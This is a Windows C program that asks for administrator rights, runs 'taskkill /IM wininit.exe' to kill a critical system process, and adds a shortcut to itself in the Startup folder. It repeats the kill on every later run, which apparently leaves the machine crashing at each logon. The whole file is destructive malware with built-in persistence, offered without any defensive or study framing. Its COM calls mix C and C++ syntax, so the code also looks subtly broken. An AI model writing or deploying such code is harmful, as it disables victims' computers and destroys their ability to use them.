#include <windows.h>
#include <stdio.h>
#include <shlobj.h>  // For SHGetFolderPath
#include <string.h>   // For strcat
#include <objbase.h>  // For CoInitialize, CoCreateInstance

#define REGISTRY_KEY "Software\\MyProgram"  // Registry key to track first run

// Function to check if the program has already run with admin privileges
BOOL IsFirstRun() {
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, REGISTRY_KEY, 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;  // Program has already run
    }
    return TRUE;  // First time running
}

// Function to mark the program as already run
void MarkAsRun() {
    HKEY hKey;
    LONG result = RegCreateKeyEx(HKEY_CURRENT_USER, REGISTRY_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
    }
}

int main() {
    // Request administrator privileges if not already running as Administrator
    BOOL isAdmin = FALSE;
    PSID administratorsGroup;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    // Initialize SID for the Administrators group
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
        FreeSid(administratorsGroup);
    }

    if (IsFirstRun()) {
        // First time running, request admin permission and execute taskkill
        printf("First time running as Administrator. Requesting permission...\n");

        SHELLEXECUTEINFO sei = {0};
        sei.cbSize = sizeof(sei);
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.hwnd = NULL;
        sei.lpVerb = "runas";  // Request elevation
        sei.lpFile = "cmd.exe";
        sei.lpParameters = "/c taskkill /IM wininit.exe";  // Taskkill command
        sei.nShow = SW_SHOWNORMAL;

        // Execute with elevated privileges
        if (!ShellExecuteEx(&sei)) {
            printf("Error requesting admin privileges.\n");
            return 1;
        }

        // Wait for process to finish
        WaitForSingleObject(sei.hProcess, INFINITE);
        CloseHandle(sei.hProcess);

        // Mark the program as already run
        MarkAsRun();

        // Add program to the Startup folder
        char szPath[MAX_PATH];
        if (SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szPath) == S_OK) {
            // Get the current executable path
            char exePath[MAX_PATH];
            GetModuleFileName(NULL, exePath, MAX_PATH);
            
            // Create a shortcut in the Startup folder
            strcat(szPath, "\\MyProgram.lnk");
            
            HRESULT hRes;
            IShellLink* psl;

            hRes = CoInitialize(NULL);
            if (SUCCEEDED(hRes)) {
                hRes = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID*)&psl);
                if (SUCCEEDED(hRes)) {
                    psl->SetPath(exePath);  // Correct method to set path
                    psl->SetArguments("");  // No arguments needed
                    
                    IPersistFile* ppf;
                    hRes = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
                    if (SUCCEEDED(hRes)) {
                        hRes = ppf->Save(szPath, TRUE);
                        ppf->Release();
                    }
                    psl->Release();
                }
                CoUninitialize();
            }
        }
    } else {
        // If it's not the first run, simply run the taskkill command
        system("taskkill /IM wininit.exe");
    }

    return 0;
}
